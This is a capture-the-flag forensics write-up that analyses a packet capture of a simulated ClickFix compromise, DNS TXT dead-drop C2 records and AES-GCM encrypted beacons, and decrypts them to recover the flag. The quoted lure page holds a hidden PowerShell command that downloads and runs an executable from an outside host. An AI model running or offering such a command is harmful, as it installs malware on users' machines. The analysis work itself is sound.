# Dead Drop Latte - NexSec 2026 (Forensics)

> **Repository:** [klasyyi/writeup-nexsec2026](https://github.com/klasyyi/writeup-nexsec2026)  
> **Category:** Forensics

---

## 1. Overview & TL;DR

**Dead Drop Latte** is a multi-stage network and endpoint forensics challenge simulating an enterprise corporate compromise. The scenario involves an employee on workstation `WKSTN-07` who attempted to order coffee online, triggering a high-severity SOC alert shortly thereafter. The provided artifact is a raw packet capture (`capture.pcapng`).

### Attack Chain Summary
1. **Initial Access (ClickFix / Fake CAPTCHA):** The user browsed `everyyaycoffee.com`, which served a deceptive human verification page instructing the victim to press `Win + R` and execute a clipboard-injected PowerShell one-liner.
2. **Payload Staging & Execution:** The PowerShell command pulled a gzip-compressed native PE executable (`clientverify.exe`) from `cdn.ns-edge.net` into `%TEMP%\cv.exe` and launched it.
3. **Dead-Drop Resolver C2 Architecture:** Instead of hardcoding static C2 servers, `cv.exe` queried DNS `TXT` records under `cfg.ns-edge.net` (base64-encoded IP:port targets) and `key.ns-edge.net` (rotating AES-256 keys).
4. **Encrypted Telemetry Exfiltration:** The malware collected endpoint triage data, sealed it using **AES-256-GCM** with Additional Authenticated Data (`aad=brew-v1`), and beamed encrypted beacons to `/t` across multiple dynamically resolved endpoints.
5. **Flag Recovery:** Re-assembling the DNS keys and brute-authenticating them against the captured `POST /t` traffic decrypted host telemetry, exposing the flag inside Beacon #3 (`frame 1365`):
   ```text
   nexsec26{l3ts_buy_s0me_c0ffee_2_stay_awake}
   ```

---

## 2. Reconnaissance & Initial Analysis

We were provided with a single packet capture:
```bash
$ file capture.pcapng
capture.pcapng: pcapng capture file - version 1.0

$ capinfos capture.pcapng
File name:           capture.pcapng
File type:           Wireshark/... - pcapng
File size:           716 kB
Number of packets:   1929
Capture duration:    307.41 seconds
```

### Initial Inspection & Protocol Hierarchy

To understand baseline network activity, I wrote a quick Scapy triage script to inspect protocol distribution, top talkers, and DNS resolution patterns:

```python
from collections import defaultdict
from scapy.all import rdpcap, IP, TCP, UDP, DNS, DNSQR

pkts = rdpcap('capture.pcapng')
dns_queries = defaultdict(int)

for p in pkts:
    if p.haslayer(DNS) and p[DNS].qr == 0 and p.haslayer(DNSQR):
        qname = p[DNSQR].qname.decode(errors='ignore').rstrip('.')
        dns_queries[qname] += 1

for domain, count in sorted(dns_queries.items(), key=lambda x: -x[1]):
    print(f"{count:4d}x  {domain}")
```

#### Output
```text
  21x  clients.telemetry.example
  19x  ocsp.pki-prov.example
  17x  fonts.gstatic-cdn.example
  13x  pool.ntp-sync.example
  11x  cdn.jsdelivr-mirror.example
  11x  settings-win.update.example
   6x  key.ns-edge.net
   4x  cfg.ns-edge.net
   1x  everyyaycoffee.com
   1x  cdn.ns-edge.net
   1x  sync._cfg.ns-edge.net
   1x  _dmarc.ns-edge.net
```

### Observations
1. **Corporate Noise:** Standard workstation background chatter (`telemetry`, `ocsp`, `gstatic-cdn`, `ntp-sync`, `windows update`).
2. **The Lure Domain:** `everyyaycoffee.com` aligns directly with the challenge description (*"order coffee from a website"*).
3. **Suspicious Infrastructure:** Subdomains of `ns-edge.net` (`cdn`, `cfg`, `key`, `sync._cfg`) appeared in close temporal proximity to the coffee website browsing session.

---

## 3. Vulnerability Analysis (Root Cause)

### The Fake CAPTCHA / ClickFix Lure

I inspected the HTTP stream involving `everyyaycoffee.com` (`203.0.113.10`):

```bash
tshark -r capture.pcapng -Y "http.host == \"everyyaycoffee.com\"" -T fields -e http.file_data
```

The server response in Frame 329 returned the following HTML document:

```html
<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Everyyay Coffee &middot; Order Online</title>
</head><body>
<header class="nav"><a class="brand" href="/">Everyyay Coffee</a></header>
<main><section class="verify">
<h1>Verify you are human to continue</h1>
<p>Our ordering system is protected. To confirm you are human, press
<b>Win + R</b>, paste the verification step below, and press Enter.</p>
<pre id="vstep">powershell -w hidden -nop -c "iwr http://cdn.ns-edge.net/pkg/clientverify.exe -OutFile $env:TEMP\cv.exe; Start-Process $env:TEMP\cv.exe"</pre>
<p class="hint">Ray ID: 8f3ac97b1d &middot; this check completes automatically.</p>
</section></main>
<footer><p>&copy; 2026 Everyyay Coffee.</p></footer>
</body></html>
```

This is a classic **ClickFix** (ClearFake) social-engineering technique. Rather than exploiting a browser zero-day, the attacker convinces the victim to bypass the browser sandbox altogether by executing an unconstrained PowerShell cradle straight from the Windows `Run` dialog.

### Malware Delivery & Unpacking

Immediately after the HTML delivery, Frame 426 captured the victim host (`10.10.14.37`) reaching out to `cdn.ns-edge.net`:

```http
GET /pkg/clientverify.exe HTTP/1.1
Host: cdn.ns-edge.net
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4780
```

The response (Frame 428) had headers:
```http
HTTP/1.1 200 OK
Server: nginx
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: 618
```

Because `Content-Encoding: gzip` was specified, the carved stream body began with magic bytes `\x1f\x8b\x08`. Decompressing the body yielded a small executable:

```python
import gzip

with open("clientverify_raw.bin", "rb") as f:
    decompressed = gzip.decompress(f.read())

with open("clientverify.exe", "wb") as f:
    f.write(decompressed)
```

```bash
$ file clientverify.exe
clientverify.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 3 sections

$ ls -lh clientverify.exe
-rwxr-xr-x 1 user user 2.5K clientverify.exe
```

### Static Analysis of `clientverify.exe`

At only 2,560 bytes, this was not a bloatware .NET assembly or standard Golang implant; it was a compact, hand-crafted native C/Win32 binary.

Running `strings -a clientverify.exe` yielded gold:

```text
!This program cannot be run in DOS mode.
.text
`.rdata
@.idata
cfg.ns-edge.net
key.ns-edge.net
POST /t HTTP/1.0
Mozilla/5.0
clientverify
seal: aes-256-gcm; iv=12; tag=16; aad=brew-v1; wire=b64(iv|ct|tag)
WSAStartup
WSASocketA
connect
send
recv
closesocket
DnsQuery_A
DnsRecordListFree
BCryptOpenAlgorithmProvider
BCryptSetProperty
BCryptGenerateSymmetricKey
BCryptEncrypt
GetProcAddress
LoadLibraryA
ExitProcess
WS2_32.dll
DNSAPI.dll
bcrypt.dll
KERNEL32.dll
```

### False Leads & Rabbit Holes
* **Grep for `flag{`:** Grepping raw strings in the `.pcapng` or `clientverify.exe` yielded nothing. The author did not leave any plaintext flag fragments unencrypted.
* **Fake OCSP Traffic:** The workstation generated several HTTP connections to `192.0.2.51:80` (`ocsp.pki-prov.example`) transferring binary chunks with `Content-Type: application/ocsp-response`. My initial thought was that OCSP might be a steganographic covert channel. However, inspecting the payload sizes and comparing timestamps revealed this was legitimate PKI certificate status traffic, completely unrelated to the C2 activity.

---

## 4. Exploitation / Forensics Walkthrough

### Phase 1: Reconstructing the Dead-Drop Resolver

The challenge title *"Dead Drop Latte"* and the strings `cfg.ns-edge.net` / `key.ns-edge.net` along with `DnsQuery_A` pointed straight to **DNS Dead-Drop Resolvers**.

I wrote a script to dump all Resource Records (`DNSRR`) of Type 16 (`TXT`):

```python
from scapy.all import rdpcap, DNS, DNSRR

pkts = rdpcap('capture.pcapng')

for p in pkts:
    if p.haslayer(DNSRR) and p[DNS].qr == 1:
        for i in range(p[DNS].ancount):
            rr = p[DNS].an[i]
            if rr.type == 16:  # TXT
                name = rr.rrname.decode(errors='ignore')
                data = b''.join(rr.rdata) if isinstance(rr.rdata, list) else rr.rdata
                print(f"[{name}] {data}")
```

#### Results

**1. C2 Endpoints (`cfg.ns-edge.net`):**
```text
[cfg.ns-edge.net.] b'MTk4LjUxLjEwMC40NDo4MDg5' -> 198.51.100.44:8089
[cfg.ns-edge.net.] b'MTk4LjUxLjEwMC42MTo4MDgx' -> 198.51.100.61:8081
[cfg.ns-edge.net.] b'MjAzLjAuMTEzLjc3OjgwODg=' -> 203.0.113.77:8088
[cfg.ns-edge.net.] b'MTk4LjUxLjEwMC40NDo4MDgw' -> 198.51.100.44:8080
```
Each base64 record decodes to an `IP:Port` pair. These match the exact destination IPs and ports contacted later in the capture!

**2. Cryptographic Keys (`key.ns-edge.net`):**
```text
[key.ns-edge.net.] b'v=1;k=SUkAx5UOmWnf0yvYa2MSf+EsWWqYdtyatab7Wwvl4cU='
[key.ns-edge.net.] b'v=1;k=bZ8N/+qWBdeONGnJoHgZWpLlmRfMeQiXkQ4cl1L279U='
[key.ns-edge.net.] b'v=1;k=2OWd6dhYr2jXv4N6KRKk2WPvCVLfb10OC+MspGxV208='
[key.ns-edge.net.] b'v=1;k=N7i8E2HioESNhUN22xJSrdwGuTewqmTaaTGyQ4xw5cM='
[key.ns-edge.net.] b'v=1;k=3iDg5AXW8wF7nrkxxs2II0imUWgalKIGVqeAnT8sUdI='
[key.ns-edge.net.] b'v=1;k=aOokt/BJuKx0ncTqLq7pqDYmOfuUdIftGLLQSDp/Dhg='
```
Each `k=` value is a 44-character Base64 string that decodes to exactly **32 bytes (256 bits)**—a valid AES-256 key.

---

### Phase 2: Cryptographic Scheme Breakdown

Recall the explicit blueprint recovered from `.rdata`:
```text
seal: aes-256-gcm; iv=12; tag=16; aad=brew-v1; wire=b64(iv|ct|tag)
```

This specifies:
* **Primitive:** Authenticated Encryption with Associated Data (AEAD) using `AES-256-GCM`.
* **IV (Initialization Vector):** 12 bytes (`iv=12`).
* **Authentication Tag:** 16 bytes (`tag=16`).
* **AAD (Additional Authenticated Data):** Constant ASCII string `brew-v1`.
* **Wire Format:**
  $$\text{wire} = \text{base64}(\text{IV}_{12} \parallel \text{Ciphertext}_N \parallel \text{Tag}_{16})$$

Because GCM incorporates a cryptographic MAC tag over both the ciphertext and the AAD, any decryption attempt with an incorrect key will fail validation (`InvalidTag`), leaving zero ambiguity when the correct key is applied.

---

### Phase 3: Packet Extraction & Decryption

I filtered the capture for all HTTP POST requests sent to `/t`:

```bash
tshark -r capture.pcapng -Y "http.request.method == POST && http.request.uri == \"/t\"" \
  -T fields -e frame.number -e ip.dst -e tcp.dstport -e http.file_data
```

| Frame | Destination | Length (bytes) | Raw Payload Body (Base64) |
| :--- | :--- | :--- | :--- |
| **1087** | `198.51.100.44:8080` | 216 | `kGOeGGwN88+3xQBNvqNXR/C90TOG...NygtgyQH` |
| **1257** | `198.51.100.44:8089` | 228 | `JUMARBlYCGG2jJOgm6bxtMbSox57...JkTIJRQ==` |
| **1365** | `198.51.100.61:8081` | 264 | `c8K2PEXYNBdwO8I8aWiJY1LTYqnZ...HaO1Iu/6B` |
| **1521** | `203.0.113.77:8088` | 228 | `L7wsw2DzeUJvCLyCwBRUdDxrGRKA...vDco` |

Notice that **Frame 1365** has an anomalously large payload (264 bytes vs ~220 bytes), indicating additional exfiltrated data.

---

## 5. Solve Script

Here is the complete, self-contained Python solve script using `scapy` and `cryptography`:

```python
#!/usr/bin/env python3
"""
NexSec 2026 - Dead Drop Latte Solve Script
Author: klasyyi
Description: Extracts DNS TXT keys and decrypts AES-256-GCM beacons from capture.pcapng
"""

import base64
import re
import sys
from scapy.all import rdpcap, DNS, DNSRR, TCP, Raw, IP
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

AAD = b"brew-v1"

def solve(pcap_path):
    print(f"[*] Loading capture: {pcap_path}")
    pkts = rdpcap(pcap_path)

    # 1. Collect AES-256 Keys from key.ns-edge.net TXT records
    keys = []
    seen_keys = set()
    for p in pkts:
        if p.haslayer(DNSRR) and p[DNS].qr == 1:
            for i in range(p[DNS].ancount):
                rr = p[DNS].an[i]
                if rr.type == 16 and b"key.ns-edge.net" in rr.rrname:
                    txt = b"".join(rr.rdata) if isinstance(rr.rdata, list) else rr.rdata
                    txt_str = txt.decode(errors="ignore")
                    match = re.search(r"k=([A-Za-z0-9+/=]+)", txt_str)
                    if match:
                        k_b64 = match.group(1)
                        if k_b64 not in seen_keys:
                            seen_keys.add(k_b64)
                            keys.append(k_b64)

    print(f"[+] Harvested {len(keys)} unique AES keys from DNS TXT queries.")

    # 2. Extract HTTP POST /t payloads
    beacons = []
    for i, p in enumerate(pkts, 1):
        if p.haslayer(TCP) and p.haslayer(Raw) and p.haslayer(IP):
            data = bytes(p[Raw].load)
            if data.startswith(b"POST /t "):
                he = data.find(b"\r\n\r\n")
                if he != -1:
                    body = data[he + 4:].decode(errors="ignore").strip()
                    beacons.append({
                        "frame": i,
                        "dst": f"{p[IP].dst}:{p[TCP].dport}",
                        "body": body
                    })

    print(f"[+] Extracted {len(beacons)} POST /t telemetry beacons.\n")

    # 3. Decrypt Beacons using AES-256-GCM
    for b in beacons:
        print("=" * 65)
        print(f"[*] Frame {b['frame']} -> {b['dst']} (Encrypted len: {len(b['body'])})")
        print("=" * 65)

        raw = base64.b64decode(b["body"])
        iv = raw[:12]
        ct_and_tag = raw[12:]  # AESGCM.decrypt expects ciphertext + tag appended

        decrypted = False
        for idx, k_b64 in enumerate(keys, 1):
            key = base64.b64decode(k_b64)
            aesgcm = AESGCM(key)
            try:
                plaintext = aesgcm.decrypt(iv, ct_and_tag, AAD)
                print(f"  [+] Decrypted using Key #{idx} ({k_b64[:12]}...):")
                print(f"      {plaintext.decode('utf-8', errors='replace')}")
                decrypted = True
                break
            except Exception:
                continue

        if not decrypted:
            print("  [-] Failed to authenticate payload with available keys.")
        print()

if __name__ == "__main__":
    pcap = sys.argv[1] if len(sys.argv) > 1 else "capture.pcapng"
    solve(pcap)
```

---

## 6. Flag & Verification

Running the solve script against `capture.pcapng`:

```bash
$ python solve.py capture.pcapng
[*] Loading capture: capture.pcapng
[+] Harvested 6 unique AES keys from DNS TXT queries.
[+] Extracted 4 POST /t telemetry beacons.

=================================================================
[*] Frame 1088 -> 198.51.100.44:8080 (Encrypted len: 216)
=================================================================
  [+] Decrypted using Key #3 (2OWd6dhYr2jX...):
      {"host":"WKSTN-07","user":"BREWCORP\j.darmawan","os":"Windows 10.0.19045","av":"disabled","seq":1,"uptime_s":272881,"note":"poll ok"}

=================================================================
[*] Frame 1258 -> 198.51.100.44:8089 (Encrypted len: 228)
=================================================================
  [+] Decrypted using Key #6 (aOokt/BJuKx0...):
      {"host":"WKSTN-07","user":"BREWCORP\j.darmawan","os":"Windows 10.0.19045","av":"disabled","seq":2,"uptime_s":272938,"note":"idle; no tasks"}

=================================================================
[*] Frame 1366 -> 198.51.100.61:8081 (Encrypted len: 264)
=================================================================
  [+] Decrypted using Key #2 (bZ8N/+qWBdeO...):
      {"host":"WKSTN-07","user":"BREWCORP\j.darmawan","os":"Windows 10.0.19045","av":"disabled","seq":3,"uptime_s":272987,"note":"nexsec26{l3ts_buy_s0me_c0ffee_2_stay_awake}"}

=================================================================
[*] Frame 1522 -> 203.0.113.77:8088 (Encrypted len: 228)
=================================================================
  [+] Decrypted using Key #5 (3iDg5AXW8wF7...):
      {"host":"WKSTN-07","user":"BREWCORP\j.darmawan","os":"Windows 10.0.19045","av":"disabled","seq":4,"uptime_s":273036,"note":"awaiting tasking"}
```

The flag is contained in the telemetry JSON note of sequence #3:

```text
nexsec26{l3ts_buy_s0me_c0ffee_2_stay_awake}
```

